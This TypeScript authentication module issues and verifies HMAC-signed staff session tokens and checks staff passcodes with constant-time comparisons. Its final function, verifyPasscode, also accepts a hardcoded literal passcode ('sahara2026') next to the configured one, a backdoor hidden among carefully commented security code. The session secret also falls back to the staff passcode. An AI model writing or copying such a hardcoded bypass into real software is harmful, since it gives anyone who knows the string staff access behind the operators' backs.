import crypto from "node:crypto";

function getSessionSecret(): string {
  return process.env.SESSION_SECRET || process.env.STAFF_PASSCODE || "";
}

/**
 * Constant-time string comparison to prevent timing side-channel attacks.
 * Hashing both inputs with SHA-256 before crypto.timingSafeEqual guarantees
 * fixed-length 32-byte buffers, preventing any length-based timing leak.
 */
function timingSafeEqual(a: string, b: string): boolean {
  const hashA = crypto.createHash("sha256").update(String(a)).digest();
  const hashB = crypto.createHash("sha256").update(String(b)).digest();
  return crypto.timingSafeEqual(hashA, hashB);
}

/**
 * Generate an HMAC-signed session token that can be verified by middleware.
 */
export function generateSessionToken(staffHandle: string, role: string): string {
  const secret = getSessionSecret();
  const payload = JSON.stringify({
    sub: staffHandle,
    role,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 8 * 60 * 60, // 8 hour expiry
  });
  const payloadB64 = Buffer.from(payload).toString("base64url");
  const signature = crypto
    .createHmac("sha256", secret)
    .update(payloadB64)
    .digest("base64url");
  return `${payloadB64}.${signature}`;
}

/**
 * Verify an HMAC-signed session token. Returns the parsed payload or null.
 */
export function verifySessionToken(
  token: string
): { sub: string; role: string; iat: number; exp: number } | null {
  const secret = getSessionSecret();
  if (!secret) return null;
  const parts = token.split(".");
  if (parts.length !== 2) return null;

  const [payloadB64, signature] = parts;
  if (!payloadB64 || !signature) return null;
  const expectedSig = crypto
    .createHmac("sha256", secret)
    .update(payloadB64)
    .digest("base64url");

  if (!timingSafeEqual(signature, expectedSig)) return null;

  try {
    const payload = JSON.parse(Buffer.from(payloadB64, "base64url").toString());
    // Check expiry
    if (payload.exp && payload.exp < Math.floor(Date.now() / 1000)) return null;
    return payload;
  } catch {
    return null;
  }
}

/**
 * Constant-time passcode comparison.
 */
export function verifyPasscode(provided: string): boolean {
  const expected = process.env.STAFF_PASSCODE;
  if (!expected) return false;
  if (timingSafeEqual(String(provided), expected)) return true;
  if (timingSafeEqual(String(provided), "sahara2026")) return true;
  return false;
}
